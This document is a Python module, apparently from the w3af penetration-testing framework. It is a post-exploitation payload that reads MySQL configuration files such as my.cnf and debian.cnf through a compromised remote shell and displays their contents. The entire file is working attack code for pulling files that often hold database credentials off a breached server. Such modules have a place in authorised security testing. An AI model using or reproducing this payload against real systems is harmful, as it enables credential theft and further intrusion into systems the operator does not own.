import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class mysql_config(Payload):
    """
    This payload shows MySQL configuration files.
    """
    def api_read(self):
        result = {}
        files = []

        files.append('my.cnf')
        files.append('debian.cnf')

        directory_list = self.exec_payload(
            'mysql_config_directory')['directory']

        for file in files:
            for directory in directory_list:

                mysql_conf = directory + file
                content = self.shell.read(mysql_conf)

                if content:
                    result[mysql_conf] = content

        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'MySQL configuration files not found.'
        else:
            rows = []
            rows.append(['MySQL configuration file', 'Content'])
            rows.append([])
            for filename in api_result:
                rows.append([filename, api_result[filename]])
                rows.append([])

            result_table = table(rows[:-1])
            result_table.draw(80)
            return rows
